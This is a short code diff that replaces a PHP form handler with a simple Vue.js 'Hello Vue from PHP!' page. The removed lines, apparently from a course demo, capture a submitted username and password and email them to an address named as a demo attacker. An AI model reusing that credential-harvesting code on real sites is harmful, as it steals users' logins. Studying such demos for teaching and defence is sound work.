@@ -1,12 +1,21 @@
-<?php
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Vue.js in PHP</title>
+    <script src="js/vue.js"></script>
+</head>
+<body>
+</body>
+</html>
 
-if ( isset( $_POST['submit'])) {
-    $username = $_REQUEST['name'];
-    $password = $_REQUEST['pass'];
+<div id="app"></div>
 
-    $msg = "Username: $username \n Password: $password";
-    mail("comp590.demo.attacker@gmail.com", "User details", $msg);
-
-} else {
-    mail("comp590.demo.attacker@gmail.com", "Test email", "Testing.");
-}
+<script>
+    new Vue({
+        el: "#app",
+        data: {
+            message: 'Hello Vue from PHP!'
+        }
+    });
+</script>
